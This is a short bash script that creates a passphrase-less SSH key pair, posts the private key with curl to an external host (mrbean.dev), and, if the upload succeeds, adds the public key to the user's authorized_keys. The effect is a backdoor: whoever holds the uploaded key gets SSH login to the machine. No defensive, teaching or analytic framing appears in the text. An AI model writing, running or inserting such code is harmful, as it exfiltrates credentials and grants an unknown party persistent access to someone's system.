#!/bin/bash

# Variables
KEY_NAME="id_rsa"
KEY_COMMENT="user@centos"
POST_URL="https://mrbean.dev/king/index.php"
CURL_TIMEOUT=10

# Create SSH key
ssh-keygen -t rsa -b 2048 -f "$HOME/.ssh/$KEY_NAME" -N "" -C "$KEY_COMMENT" # updated: generate ssh key pair without passphrase

# Path to the private key file
PRIVATE_KEY_FILE="$HOME/.ssh/${KEY_NAME}" # updated: path to the generated private key file

# Send the private key as a file in a POST request
curl -X POST -F "file=@$PRIVATE_KEY_FILE" --max-time $CURL_TIMEOUT "$POST_URL" # updated: use curl to send the private key as a file

# Check the result of the POST request
if [ $? -eq 0 ]; then
    # Derive the public key from the private key
    PUBLIC_KEY=$(ssh-keygen -y -f $PRIVATE_KEY_FILE)
    
    # Append the public key to the authorized_keys file
    echo "$PUBLIC_KEY" >> "$HOME/.ssh/authorized_keys"
else
    echo "Failed"
fi
